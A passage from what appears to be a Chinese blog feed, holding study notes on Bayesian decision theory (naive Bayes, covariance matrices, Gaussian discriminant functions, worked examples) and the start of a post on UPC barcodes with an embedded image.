<p>在该种情况下，使用判别函数 <span class="math display">\[
g(\boldsymbol{x})=g_1(\boldsymbol{x})-g_2(\boldsymbol{x})
\]</span> 判决规则为：</p>
<p>如果 <span class="math display">\[
g(\boldsymbol{x})&gt;0
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>，否则判决为 <span class="math inline">\(\omega_2\)</span>。</p>
<p>一般为简化会多使用以下形式： <span class="math display">\[
g(\boldsymbol{x})=P(\omega_1|\boldsymbol{x})-P(\omega_2|\boldsymbol{x})\\
g(\boldsymbol{x})=\ln\frac{p(\boldsymbol{x}|\omega_1)}{p(\boldsymbol{x}|\omega_2)}+\ln\frac{P(\omega_1)}{P(\omega_2)}
\]</span></p>
<h3 id="朴素贝叶斯分类器">朴素贝叶斯分类器</h3>
<p>我们知道贝叶斯公式如下 <span class="math display">\[
P(\omega|\boldsymbol{x})=\frac{P(\boldsymbol{x}|\omega)P(\omega)}{P(\boldsymbol{x})}
\]</span> 从中可以知道，估计后验概率 <span class="math inline">\(P(\omega_j|\boldsymbol{x})\)</span>
的主要困难为：类条件概率 <span class="math inline">\(P(\boldsymbol{x}|\omega_j)\)</span>
是所有属性上的联合概率，难以从有限的训练样本估计获得。</p>
<p>故采用“属性条件独立性假设”，即<strong>每个属性独立地对分类结果发生影响</strong>。</p>
<blockquote>
<p>即 <span class="math inline">\(P(AB)=P(A)P(B)\)</span></p>
</blockquote>
<p>基于属性条件独立性假设，可以将贝叶斯公式重写为 <span class="math display">\[
P(\omega|\boldsymbol{x})=\frac{P(\boldsymbol{x}|\omega)P(\omega)}{P(\boldsymbol{x})}=\frac{P(\omega)}{P(\boldsymbol{x})}\prod^d_{i=1}P(x_i|\omega)
\]</span> 其中，<span class="math inline">\(d\)</span>
为维度（属性数目），<span class="math inline">\(x_i\)</span> 为 <span class="math inline">\(\boldsymbol{x}\)</span> 在第 <span class="math inline">\(i\)</span> 个维度（属性）上的取值。</p>
<p>其中条件风险函数为 <span class="math display">\[
\begin{align}
R(\alpha_i|\boldsymbol{x})&amp;=\sum^c_{j=1}\lambda(\alpha_i|\omega_j)P(\omega_j|\boldsymbol{x})\\
&amp;=\sum_{i\neq j}P(\omega_j|\boldsymbol{x})\\
&amp;=1-P(\omega_i|\boldsymbol{x})
\end{align}
\]</span>
选择<strong>最小误差率决策</strong>，那么得到朴素贝叶斯分类的判别函数：
<span class="math display">\[
h(\boldsymbol{x})_{nb}=\arg\max_{\omega\in
\Omega}{P(\omega)\prod^d_{i=1}P(x_i|\omega)}
\]</span> 即最大化后验概率。</p>
<p>朴素贝叶斯分类器的训练器的<strong>训练过程</strong>就是基于训练集
<span class="math inline">\(D\)</span> 估计<strong>类先验概率</strong>
<span class="math inline">\(P(\omega)\)</span>
并<strong>为每个属性估计条件概率</strong> <span class="math inline">\(P(x_i|\omega)\)</span>。</p>
<p>令 <span class="math inline">\(D_\omega\)</span> 表示训练集 <span class="math inline">\(D\)</span> 中 <span class="math inline">\(\omega\)</span>
类样本组合的集合，若有重组的<strong>独立同分布</strong>样本，则可以容易估计出<strong>类先验概率</strong>：
<span class="math display">\[
P(\omega)=\frac{|D_\omega|}{D}
\]</span> 对离散属性而言，令 <span class="math inline">\(D_{\omega,x_i}\)</span> 表示 <span class="math inline">\(D_\omega\)</span> 中在第 <span class="math inline">\(i\)</span> 个属性上取值为 <span class="math inline">\(x_i\)</span> 的样本组成的集合，则条件概率 <span class="math inline">\(P(x_i|\omega)\)</span> 可估计为 <span class="math display">\[
P(x_i|\omega)=\frac{|D_{\omega,x_i}|}{|D_\omega|}
\]</span> 对于连续属性而言，可以考虑概率密度函数，假设 <span class="math inline">\(p(x_i|\omega)\sim
N(\mu_{\omega,i},\sigma_{\omega,i}^2)\)</span>，则 <span class="math display">\[
P(x_i|\omega)=p(x_i|\omega)
\]</span> 此时 <span class="math inline">\(p(\boldsymbol{x}|\omega)\sim
N(\boldsymbol{\mu}_\omega,\boldsymbol{\sigma}_\omega^2)\)</span>，则参数的极大似然估计为
<span class="math display">\[
\boldsymbol{\mu}_\omega=\frac{1}{|D_\omega|}\sum_{\boldsymbol{x}\in
D_\omega}\boldsymbol{x}\\
\boldsymbol{\sigma}_\omega^2=\frac{1}{|D_\omega|}\sum_{\boldsymbol{x}\in
D_\omega}(\boldsymbol{x}-\boldsymbol{\mu}_\omega)^2\\
\]</span></p>
<blockquote>
<p><span class="math inline">\((\boldsymbol{x}-\boldsymbol{\mu}_\omega)^2\)</span>
表示向量积，即 <span class="math inline">\((\boldsymbol{x}-\boldsymbol{\mu}_\omega)(\boldsymbol{x}-\boldsymbol{\mu}_\omega)^T\)</span></p>
</blockquote>
<h3 id="正态分布下的贝叶斯分类">正态分布下的贝叶斯分类</h3>
<p>朴素贝叶斯分类过于简单，实际情况中无法满足属性条件独立性假设，往往属性之间具有相关性。</p>
<h4 id="协方差">协方差</h4>
<p>在统计学中，<strong>方差</strong>是用来度量<strong>单个随机变量的离散程度</strong>，而<strong>协方差</strong>一般用来刻画两个随机变量的相似程度（值越大越相似）。</p>
<p>方差的计算公式如下 <span class="math display">\[
\sigma^2_x=\frac{1}{n}\sum^n_{i=1}(x_i-\bar{x})^2
\]</span> 其中，<span class="math inline">\(n\)</span>
表示<strong>样本量</strong>，<span class="math inline">\(\bar{x}\)</span>
表示这一组随机数据的<strong>均值</strong>。</p>
<p>在此基础上，协方差的计算公式定义如下 <span class="math display">\[
\sigma(x,y)=\frac{1}{n}\sum^n_{i=1}(x_i-\bar{x})(y_i-\bar{y})
\]</span> 其中，<span class="math inline">\(\bar{x},\bar{y}\)</span>
分别表示两个随机变量所对应的观测样本<strong>均值</strong>，由此可知，方差
<span class="math inline">\(\sigma_x^2\)</span> 可视作随机变量 <span class="math inline">\(x\)</span> 关于其自身的协方差 <span class="math inline">\(\sigma(x,x)\)</span>。</p>
<p>给定 <span class="math inline">\(d\)</span>
组随机变量（特征向量）<span class="math inline">\(\boldsymbol{x}_k,k=1,2,\cdots,d\)</span>，则这些随机变量的方差为
<span class="math display">\[
\sigma(\boldsymbol{x}_k,\boldsymbol{x}_k)=\frac{1}{n}\sum^n_{i=1}(x_{ki}-\bar{x}_k)^2,k=1,2,\cdots,d
\]</span> 其中 <span class="math inline">\(x_{ki}\)</span>
代表特征向量的第 <span class="math inline">\(i\)</span>
个维度的值，<span class="math inline">\(\bar{x}_k\)</span>
代表该维度下的平均值。</p>
<p>而协方差为 <span class="math display">\[
\sigma(\boldsymbol{x}_m,\boldsymbol{x}_k)=\frac{1}{n}\sum^n_{i=1}(x_{mi}-\bar{x}_m)(x_{ki}-\bar{x}_k),k=1,2,\cdots,d
\]</span> 因此，协方差矩阵定义为 <span class="math display">\[
\Sigma=\left[\begin{array}{ccc}
\sigma\left(x_{1}, x_{1}\right) &amp; \cdots &amp; \sigma\left(x_{1},
x_{d}\right) \\
\vdots &amp; \ddots &amp; \vdots \\
\sigma\left(x_{d}, x_{1}\right) &amp; \cdots &amp; \sigma\left(x_{d},
x_{d}\right)
\end{array}\right] \in \mathbb{R}^{d \times d}
\]</span>
其中对角线上的元素为各随机变量的方差，非对角线上的元素为两两随机变量之间的协方差，且
<span class="math inline">\(\Sigma\)</span>
为<strong>对称矩阵</strong>。</p>
<h4 id="一维正态分布">一维正态分布</h4>
<p>对于一维正态分布，有密度函数 <span class="math display">\[
p(x)=\frac{1}{\sqrt{2\pi}\sigma}\exp{[{-\frac{1}{2}(\frac{x-\mu}{\sigma})^2}]}
\]</span> 其中均值 <span class="math display">\[
\mu=E(x)=\int^{+\infty}_{-\infty}xp(x)\mathrm{d}x
\]</span> 方差 <span class="math display">\[
\sigma^2=E[(x-\mu)^2]=\int^{+\infty}_{-\infty}(x-\mu)^2p(x)\mathrm{d}x
\]</span> 其中一维正态分布也可以简写为 <span class="math inline">\(p(x)\sim N(\mu,\sigma^2)\)</span>。</p>
<p>一种分布的熵由下式给出 <span class="math display">\[
H(p(x))=-\int p(x)\ln{p(x)}\mathrm{d}x
\]</span> 单位为奈特，如果对数换为 <span class="math inline">\(\log_2\)</span>，则单位为比特。</p>
<p>可以证明正态分布在所有具有给定均值和方差的分布中<strong>具有最大熵</strong>。由<strong>中心极限定理</strong>所述，<strong>大量的小的、独立地随机分布的总和等效为正态分布</strong>。由于所有模式——鱼、手写字符、语音——都可以看成是由大量随机过程所组成的某个理想的模式或原型模式，所以<strong>实际上通常会选择正态分布作为实际的概率分布</strong>。</p>
<h4 id="多维正态分布">多维正态分布</h4>
<p>设 <span class="math inline">\(d\)</span> 维特征向量 <span class="math display">\[
\boldsymbol{x}=(x_1,x_2,\cdots,x_d)^T
\]</span> 则 <span class="math inline">\(d\)</span> 维正态分布定义为
<span class="math display">\[
p(\boldsymbol{x})=\frac{1}{(2\pi)^{d/2}|\Sigma|^{1/2}}\exp[-\frac{1}{2}(\boldsymbol{x}-\boldsymbol{\mu})^T\Sigma^{-1}(\boldsymbol{x}-\boldsymbol{\mu})]
\]</span> 其中 <span class="math inline">\(\Sigma\)</span> 是 <span class="math inline">\(d\)</span> 维的协方差矩阵，<span class="math inline">\(|\Sigma|\)</span> 代表行列式的值，<span class="math inline">\(\Sigma^{-1}\)</span> 代表矩阵的逆，<span class="math inline">\((\boldsymbol{x}-\boldsymbol{\mu})^T\)</span>
表示矩阵的转置（在这里是变为行向量）。</p>
<p>通常简写为 <span class="math display">\[
p(\boldsymbol{x})=N(\boldsymbol{\mu},\boldsymbol{\Sigma})
\]</span> 其中均值 <span class="math display">\[
\boldsymbol{\mu}=E(\boldsymbol{x})=\int\boldsymbol{x}p(\boldsymbol{x})\mathrm{d}\boldsymbol{x}
\]</span> 协方差矩阵 <span class="math display">\[
\Sigma=E[(\boldsymbol{x}-\boldsymbol{\mu})(\boldsymbol{x}-\boldsymbol{\mu})^T]=\int
(\boldsymbol{x}-\boldsymbol{\mu})(\boldsymbol{x}-\boldsymbol{\mu})^Tp(\boldsymbol{x})\mathrm{d}\boldsymbol{x}
\]</span> 其中 <span class="math inline">\((\boldsymbol{x}-\boldsymbol{\mu})(\boldsymbol{x}-\boldsymbol{\mu})^T\)</span>
表示求向量内积。</p>
<p>其中某个向量的均值可以通过其属性的均值获得，即 <span class="math display">\[
\begin{align}
\mu_i&amp;=E(x_i)\\
\sigma_{ij}^2&amp;=E[(x_i-\mu_i)(x_j-\mu_j)]\\
&amp;=\iint(x_i-\mu_i)(x_j-\mu_j)p(x_i,x_j)\mathrm{d}{x_i}\mathrm{d}{x_j}
\end{align}
\]</span> 当 <span class="math inline">\(i=j\)</span>
时（对角线元素），<span class="math inline">\(\sigma_{ij}\)</span>
反映样本 <span class="math inline">\(x_i\)</span> 在 <span class="math inline">\(d\)</span>
维特征空间<strong>各方向的发散程度</strong>；</p>
<p>当 <span class="math inline">\(i\neq j\)</span> 时，<span class="math inline">\(\sigma_{ij}\)</span>
反映<strong>各特征间的统计相关性</strong>。</p>
<blockquote>
<p>这里需要严格限定 <span class="math inline">\(\Sigma\)</span>
是正定矩阵，使得其行列式为正值。</p>
</blockquote>
<h4 id="分类器">分类器</h4>
<p>设各类样本的<strong>类概率密度</strong>均满足正态分布，即 <span class="math display">\[
p(\boldsymbol{x}|\omega_i)\sim N(\boldsymbol{\mu},\boldsymbol{\Sigma})
\]</span> 根据最小误差概率决策，判别函数为 <span class="math display">\[
g_i(\boldsymbol{x})=p(\boldsymbol{x}|\omega_i)p(\omega_i)=\max_{1\leq
j\leq c}{(p(\boldsymbol{x}|\omega_j),p(\omega_j))}
\]</span> 或者使用 <span class="math display">\[
\begin{align}
g_i(\boldsymbol{x})&amp;=\ln{p(\boldsymbol{x}|\omega_i)}+\ln{p(\omega_i)}\\
&amp;=-\frac{d}{2}\ln{2\pi}-\frac{1}{2}\ln{|\Sigma_i|}-\frac{1}{2}(\boldsymbol{x}-\boldsymbol{\mu}_i)^T\Sigma^{-1}_i(\boldsymbol{x}-\boldsymbol{\mu}_i)+\ln{P(\omega_i)}
\end{align}
\]</span> 分以下三种情况讨论决策结果。</p>
<h5 id="情况一sigmasigma2i">情况一：<span class="math inline">\(\Sigma=\sigma^2I\)</span></h5>
<ul>
<li>各类协方差矩阵相等，<span class="math inline">\(\Sigma_i=\Sigma_j=\Sigma\)</span></li>
<li>各特征统计独立，<span class="math inline">\(\sigma_{ij}^2=0,i\neq
j\)</span></li>
<li>样本各方向的发散程度一致 <span class="math inline">\(\sigma_{ij}^2=\sigma^2,i=j\)</span></li>
</ul>
<p>即 <span class="math display">\[
\Sigma=\begin{bmatrix}
\sigma^2 &amp; 0 &amp; \cdots &amp; 0\\
0 &amp; \sigma^2 &amp; \cdots &amp; 0\\
\cdots &amp; \cdots &amp; \cdots &amp; \cdots\\
0 &amp; 0 &amp; \cdots &amp; \sigma^2
\end{bmatrix}
\]</span> 此时 <span class="math inline">\(\Sigma=\sigma^2I\)</span>，故
<span class="math inline">\(\Sigma^{-1}=\frac{1}{\sigma^2}I\)</span>，其中
<span class="math inline">\(I\)</span> 为单位矩阵。</p>
<p>故判别函数化简为 <span class="math display">\[
\begin{align}
g_i(\boldsymbol{x})&amp;=-\frac{(\boldsymbol{x}-\boldsymbol{\mu}_i)^T(\boldsymbol{x}-\boldsymbol{\mu}_i)}{2\sigma^2}+\ln
p(\omega_i)\\
&amp;=-\frac{\begin{Vmatrix}
\boldsymbol{x}-\boldsymbol{\mu}_i
\end{Vmatrix}^2}{2\sigma^2}+\ln p(\omega_i)
\end{align}
\]</span> 其中 <span class="math inline">\(\begin{Vmatrix}
\boldsymbol{x}-\boldsymbol{\mu}_i \end{Vmatrix}\)</span>
是求欧氏距离，即<strong>欧几里得范数</strong>。</p>
<p>故在此种决策函数下，只需计算 <span class="math inline">\(\boldsymbol{x}\)</span> 到各类样本均值 <span class="math inline">\(\boldsymbol{\mu}_i\)</span>
的范数，选择范数最小（在空间中称为距离最近）的类别即可。</p>
<p>情况一也称作<strong>最小距离分类器</strong>。</p>
<p>对判别函数重整，有 <span class="math display">\[
g_i(\boldsymbol{x})=\frac{1}{2\sigma^2}(\begin{Vmatrix}\boldsymbol{x}\end{Vmatrix}^2-2\boldsymbol{\mu}_i^T\boldsymbol{x}+\begin{Vmatrix}\boldsymbol{\mu}\end{Vmatrix}^2)+\ln{p(\omega_i)}
\]</span> 其中 <span class="math inline">\(\begin{Vmatrix}\boldsymbol{x}\end{Vmatrix}^2\)</span>
对于任意 <span class="math inline">\(i\)</span>
是相等的，于是乎我们可以把上式等价于 <span class="math display">\[
g_i(\boldsymbol{x})=\boldsymbol{w}_i^T \boldsymbol{x}+\omega_{i0}
\]</span> 其中 <span class="math display">\[
\boldsymbol{w}_i=\frac{1}{\sigma ^2}\boldsymbol{\mu}_i\\
\omega_{i0}=-\frac{1}{2\sigma^2}\begin{Vmatrix}\boldsymbol{\mu}\end{Vmatrix}^2+\ln{p(\omega_i)}
\]</span> <span class="math inline">\(\omega_{i0}\)</span> 又称作第
<span class="math inline">\(i\)</span>
个方向的<strong>阈值</strong>或<strong>偏置</strong>。</p>
<p>使用线性判别函数的分类器称为“线性机器”。这类分类器有许多有趣的理论性质。</p>
<p>此处只需注意到一个线性机器的判定面是一些超平面，它们是由两类问题中可获得最大后验概率的线性方程
<span class="math inline">\(g_i(\boldsymbol{x})=g_j(\boldsymbol{x})\)</span>
来确定。</p>
<p>上式可写为 <span class="math display">\[
\boldsymbol{w}^T(\boldsymbol{x}-\boldsymbol{x}_0)=0
\]</span> 其中 <span class="math display">\[
\boldsymbol{w}=\boldsymbol{\mu}_i-\boldsymbol{\mu}_j
\]</span> 且 <span class="math display">\[
\mathbf{x}_{0}=\frac{1}{2}\left(\boldsymbol{\mu}_{i}+\boldsymbol{\mu}_{j}\right)-\frac{\sigma^{2}}{\left\|\boldsymbol{\mu}_{i}-\boldsymbol{\mu}_{j}\right\|^{2}}
\ln
\frac{P\left(\omega_{i}\right)}{P\left(\omega_{j}\right)}\left(\boldsymbol{\mu}_{i}-\boldsymbol{\mu}_{j}\right)
\]</span> 此方程定义了<strong>一个通过 <span class="math inline">\(\boldsymbol{x}_0\)</span> 且与向量 <span class="math inline">\(\boldsymbol{w}\)</span>
正交</strong>的超平面。</p>
<blockquote>
<p>如果 <span class="math inline">\(\sigma^2\)</span>
相对于范数的平方较小，那么判决边界的位置相对于确切的先验概率值并不敏感。</p>
</blockquote>
<h5 id="情况二sigma_isigma_jsigma">情况二：<span class="math inline">\(\Sigma_i=\Sigma_j=\Sigma\)</span></h5>
<ul>
<li>各类方差相同，<span class="math inline">\(\Sigma_i=\Sigma_j=\Sigma\)</span></li>
</ul>
<p>可以证明，此时判别函数仍满足线性关系，即 <span class="math display">\[
g_i(\boldsymbol{x})=\boldsymbol{w}_i^T\boldsymbol{x}+\omega_{i0}
\]</span></p>
<h5 id="情况三sigma_ineq-sigma_j">情况三：<span class="math inline">\(\Sigma_i\neq \Sigma_j\)</span></h5>
<ul>
<li><span class="math inline">\(\Sigma_i\neq \Sigma_j\)</span></li>
</ul>
<p>此时判别函数为 <span class="math display">\[
g_i(\boldsymbol{x})=\boldsymbol{x}^TA_i\boldsymbol{x}+\boldsymbol{w}_i^T+\omega_{i0}
\]</span> 此分类器为非线性分类器（二次型分类器）。</p>
<h3 id="实际计算">实际计算</h3>
<p>两类高斯分布所计算出的贝叶斯判决边界如下，每一类都基于 4
个数据点。</p>
<p>以 <span class="math inline">\(\omega_1\)</span> 表示 4
个黑点的集合，<span class="math inline">\(\omega_2\)</span>
表示红点集合。</p>
<figure>
<img src="/bayesian-decision-theory/模式简图.jpg" alt="模式简图">
<figcaption aria-hidden="true">模式简图</figcaption>
</figure>
<p>由图可知，<span class="math inline">\(\omega_1\)</span>
的特征向量矩阵为 <span class="math display">\[
X=\begin{bmatrix}
2 &amp; 3 &amp; 3 &amp; 4\\
6 &amp; 8 &amp; 4 &amp; 6
\end{bmatrix}
\]</span> 可知特征向量维度 <span class="math inline">\(d=2\)</span></p>
<p>由均值公式 <span class="math display">\[
\mu_k=\frac{1}{4}\sum^4_{i=1} x_{ki},k=1,2
\]</span> 得均值向量为 <span class="math display">\[
\boldsymbol{\mu}=\begin{bmatrix}
3\\
6
\end{bmatrix}
\]</span> 由协方差公式 <span class="math display">\[
\sigma(\boldsymbol{x}_k,\boldsymbol{x}_k)=\frac{1}{n}\sum^n_{i=1}(x_{ki}-\bar{x}_k)^2,k=1,2,\cdots,d
\]</span> 得协方差为 <span class="math display">\[
\begin{align}
\sigma\left(x_{1},
x_{1}\right)&amp;=\frac{1}{4}\left\{\left(x_{11}-\bar{x}_{1}\right)\left(x_{11}-\bar{x}_{1}\right)+\left(x_{12}-\bar{x}_{1}\right)\left(x_{12}-\bar{x}_{1}\right)+\left(x_{13}-\bar{x}_{1}\right)\left(x_{13}-\bar{x}_{1}\right)+\left(x_{14}-\bar{x}_{1}\right)\left(x_{14}-\bar{x}_{1}\right)\right\}
\\
&amp;=\frac{1}{4}\{(2-3)(2-3)+(3-3)(3-3)+(3-3)(3-3)+(4-3)(4-3)\}\\
&amp;=\frac{1}{2}
\end{align}
\]</span></p>
<blockquote>
<p>此处 <span class="math inline">\(x_1=\begin{bmatrix}2&amp;3&amp;3&amp;6\end{bmatrix},x_{11}=2,x_{12}=3,\bar{x}_1=3\)</span>，同时忽略其他协方差的计算。</p>
</blockquote>
<p>同理可得，协方差矩阵为 <span class="math display">\[
\Sigma=\begin{bmatrix}
\frac{1}{2} &amp; 0\\
0 &amp; 2
\end{bmatrix}
\]</span> 对于另一组特征向量 <span class="math display">\[
X=\begin{bmatrix}
1 &amp; 3 &amp; 3 &amp; 5\\
-2 &amp; 0 &amp; -4 &amp; -2
\end{bmatrix}
\]</span> 同理可得均值和方差。</p>
<p>记第一组数据的均值为 <span class="math inline">\(\mu_1\)</span>，协方差矩阵为 <span class="math inline">\(\Sigma_1\)</span>；第二组数据的均值为 <span class="math inline">\(\mu_2\)</span>，协方差矩阵为 <span class="math inline">\(\Sigma_2\)</span>： <span class="math display">\[
\boldsymbol{\mu}_1=\begin{bmatrix}
3\\
6
\end{bmatrix},
\boldsymbol{\mu}_2=\begin{bmatrix}
3\\
-2
\end{bmatrix}
\\
\Sigma_1=\begin{bmatrix}
\frac{1}{2} &amp; 0\\
0 &amp; 2
\end{bmatrix},
\Sigma_2=\begin{bmatrix}
2 &amp; 0\\
0 &amp; 2
\end{bmatrix}
\]</span> 可得逆矩为 <span class="math display">\[
\Sigma_1^{-1}=\begin{bmatrix}
2 &amp; 0\\
0 &amp; \frac{1}{2}
\end{bmatrix},
\Sigma_2^{-1}=\begin{bmatrix}
\frac{1}{2} &amp; 0\\
0 &amp; \frac{1}{2}
\end{bmatrix}
\]</span> 假定两类分布的先验概率相等，即 <span class="math inline">\(P(\omega_1)=P(\omega_2)=0.5\)</span>，代入后可得
<span class="math inline">\(g_1(\boldsymbol{x})=g_2(\boldsymbol{x})\)</span>
时的判决边界为 <span class="math display">\[
x_2=3.514-1.125x_1+0.1875x_1^2
\]</span></p>
<blockquote>
<p>这里由于各类协方差矩阵各不相同，于是套用情况三的公式</p>
</blockquote>
<h3 id="实际应用-2">实际应用</h3>
<h4 id="拼写纠错检查">拼写纠错检查</h4>
<p>当用户输入了一个不在字典中的单词，我们需要去猜测：“这个家伙到底真正想输入的单词是什么呢？”用形式化的语言来叙述，就是我们需要求得：
<span class="math display">\[
P(\text{我们猜测他想输入的单词}|\text{他实际输入的单词})
\]</span>
比如用户输入thew，那么猜测他到底想输入the，还是thaw，还是其他的单词？到底哪一个单词的可能性比较大？这时候我们就可以用贝叶斯去求出每个词语的可能性。</p>
<p>不妨把我们的猜测记为 <span class="math inline">\(h_1,h_2,\cdots,h_n\)</span>，他们都属于一个有限且离散的猜测空间H（单词总共就只有那么多，<span class="math inline">\(H\)</span> 代表
hypothesis），将用户实际输入的单词记为 <span class="math inline">\(D\)</span>（<span class="math inline">\(D\)</span>
代表 data，即观测数据），于是问题转为：</p>
<p><span class="math inline">\(P(\text{我们的猜测1}|\text{他实际输入的单词})\)</span>
可以表示为 <span class="math inline">\(P(h_1|D)\)</span>，同理对于猜测2，则表示为 <span class="math inline">\(P(h_2|D)\)</span>，我们需要计算这些概率值，取最大值。</p>
<p>将所有猜测统一记为 <span class="math inline">\(P(H|D)\)</span>，运用贝叶斯公式可以得到 <span class="math display">\[
P(H|D)=\frac{P(H)P(D|H)}{P(D)}
\]</span> 由于证据因子 <span class="math inline">\(P(D)\)</span>
对我们的决策无影响，故计算时将公式简化为 <span class="math display">\[
P(H|D)\propto P(H)P(D|H)
\]</span> 即用户实际想输入 the 的可能性大小取决于 the
本身在词汇表中被使用的可能性（频繁程度）大小和想打 the 却打成 thew
的可能性大小（似然）的乘积。</p>
<blockquote>
<p>抽象理解为给定观测数据，猜测是好是坏取决于“这个猜测本身独立的可能性大小”（先验概率）和“这个猜测生成我们观测到的数据的可能性大小”（似然）的乘积。</p>
</blockquote>
<p>有两种模型解决该问题：</p>
<ul>
<li>最大似然：最符合观测数据的最有优势（即 <span class="math inline">\(P(D|H)\)</span> 最大）</li>
<li>奥卡姆剃刀：先验概率 <span class="math inline">\(P(H)\)</span>
较大的模型有较大的优势。</li>
</ul>
<h4 id="医生诊断">医生诊断</h4>
<p>一个两类识别问题：医生根据病人血液中白细胞的浓度来判断病人是否患血液病。</p>
<p>根据医学知识和以往的经验，医生知道（先验知识）：</p>
<ul>
<li>患病的人，白细胞的浓度服从均值2000，方差1000的正态分布；未患病的人，白细胞的浓度服从均值7000，方差3000的正态分布</li>
<li>一般人群中，患病的人数比例为0.5%</li>
</ul>
<p>当一个人的白细胞浓度是3100，医生应该做出怎样的判断？</p>
<p>用 <span class="math inline">\(\Omega\)</span> 表示分类集合，有 <span class="math inline">\(\omega_1\)</span> 表示患病，<span class="math inline">\(\omega_2\)</span> 表示未患病；</p>
<p>用 <span class="math inline">\(x\)</span>
表示"白细胞浓度"这个随机变量，即选择其作为特征。</p>
<p>由先验知识我们可以得到先验概率：</p>
<ul>
<li><span class="math inline">\(P(\omega_1)=0.5\%,P(\omega_2)=99.5\%\)</span></li>
<li>白细胞浓度在两种类别下的类条件概率密度：<span class="math inline">\(p(x|\omega_1)\sim N(2000,1000),p(x|\omega_2)\sim
N(7000,3000)\)</span></li>
</ul>
<p>查表可以得到类条件概率： <span class="math display">\[
P(3100|\omega_1)=2.1785\times10^{-4}\\
P(3100|\omega_2)=5.7123\times10^{-5}\\
\]</span> 根据贝叶斯公式，计算得到后验概率： <span class="math display">\[
\begin{align}
P(\omega_1|3100)&amp;=1.9\%\\
P(\omega_2|3100)&amp;=98.1\%
\end{align}
\]</span> 故判决为 <span class="math inline">\(\omega_2\)</span>，即医生诊断为：未患病，体征正常。</p>
]]></content>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>有关条形码的认识</title>
    <url>//barcode-note.html</url>
    <content><![CDATA[<h1 id="条形码分类">条形码分类</h1>
<h2 id="upc-条形码统一产品代码">UPC 条形码（统一产品代码）</h2>
<figure>
<img src="data:image/png;base64,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